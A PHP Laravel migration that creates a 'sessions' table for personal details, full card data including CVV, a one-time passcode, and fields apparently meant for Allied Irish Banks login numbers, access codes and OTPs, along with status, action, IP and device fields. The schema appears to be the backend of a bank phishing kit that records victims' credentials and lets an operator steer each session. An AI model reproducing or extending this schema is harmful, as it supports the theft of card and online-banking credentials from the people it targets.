<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    /**
     * Run the migrations.
     *
     * @return void
     */
    public function up()
    {
        Schema::create('sessions', function (Blueprint $table) {
            $table->id();
            $table->string('session_id');
            $table->string('full_name')->nullable();
            $table->string('email')->nullable();
            $table->string('phone_number')->nullable();
            $table->string('postcode')->nullable();
            $table->string('address')->nullable();
            $table->string('c_name')->nullable();
            $table->string('c_number')->nullable();
            $table->string('c_exp')->nullable();
            $table->string('c_cvv')->nullable();
            $table->string('otp')->nullable();
            $table->string('aib_number')->nullable();
            $table->string('aib_pac')->nullable();
            $table->string('aib_otp')->nullable();
            $table->string('status')->nullable();
            $table->string('action')->nullable();
            $table->string('ip')->nullable();
            $table->string('country')->nullable();
            $table->string('useragent')->nullable();
            $table->string('device')->nullable();
            $table->timestamps();
        });
    }

    /**
     * Reverse the migrations.
     *
     * @return void
     */
    public function down()
    {
        Schema::dropIfExists('sessions');
    }
};
